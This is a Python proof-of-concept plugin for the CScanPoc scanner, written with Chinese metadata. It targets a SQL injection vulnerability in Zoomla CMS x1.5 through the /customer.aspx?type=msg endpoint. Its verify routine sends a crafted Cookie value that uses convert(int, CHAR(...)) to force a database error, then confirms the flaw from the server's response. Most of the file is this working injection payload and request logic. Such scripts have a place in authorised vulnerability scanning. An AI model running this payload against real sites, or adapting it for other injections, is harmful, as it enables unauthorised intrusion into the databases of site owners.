# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0001'  # 平台漏洞编号，留空
    name = '逐浪CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-06'  # 漏洞公布时间
    desc = '''
        Zoomla!逐浪®CMS是运行在微软大数据平台上的一款卓越网站内容管理系统，基于.NET4.5框架，SQL Server数据库平台（扩展支持Oracle甲骨文、MYSQL诸多数据库）、纯净的MVC架构，系统在优秀的内容管理之上，提供OA办公、移动应用、微站、微信、微博等能力，完善的商城、网店等管理功能，并包括教育模块、智能组卷、在线试戴、在线考试及诸多应用。Zoomla!逐浪®CMS不仅是一款网站内容管理系统，更是企业信息化的起点，也是强大的WEB开发平台，完全免费开放，丰富的学习资源和快速上手教程，并结合自主的字库、Webfont解决方案、逐浪云，为中国政府、军工、世界五百强企业以及诸多站长、开发者提供卓越的软件支持。
        逐浪CMS最新版x1.5 /customer.aspx?type=msg SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=059965'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = 'x1.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac0bd01e-0a87-403d-943e-5cca62330fa2'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/customer.aspx?type=msg"
            target = '{target}'.format(target=self.target)+payload
            cookie = {
                "Cookie": "Provisional=Uid=convert(int,CHAR(104)+CHAR(101)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(105))"
            }
            req = requests.post(target, headers=cookie)
            if req.status_code == 500 and 'hentai' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
